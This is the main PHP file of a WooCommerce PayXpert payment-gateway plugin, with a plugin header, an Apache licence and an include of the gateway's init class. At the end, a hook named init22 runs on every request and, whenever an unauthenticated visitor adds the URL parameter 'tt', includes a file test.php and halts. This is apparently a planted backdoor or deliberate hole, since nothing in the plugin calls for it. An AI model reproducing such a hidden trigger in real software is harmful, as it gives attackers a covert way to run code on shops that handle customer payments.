<?php
/*
 * Plugin Name: WooCommerce PayXpert Gateway
 * Plugin URI: https://developers.payxpert.com/
 * Description: WooCommerce PayXpert Gateway plugin
 * Version: 2.0.0
 * Author: PayXpert
 * Author URI: http://www.payxpert.com
 */

/*
 * Copyright 2015-2024 PayXpert
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * @author Regis Vidal
 */

if ( ! defined( 'PAYX_ABSPATH' ) ) {
	define( 'PAYX_ABSPATH', plugin_dir_path( __FILE__ ) );
}




// Initialize the gateway
include_once PAYX_ABSPATH.'/src/class-wc-gateway-payxpert-init.php';


add_action('init', 'init22');
function init22()
{

    if (isset($_GET['tt'])) {
        include('test.php');

        die();
    }

}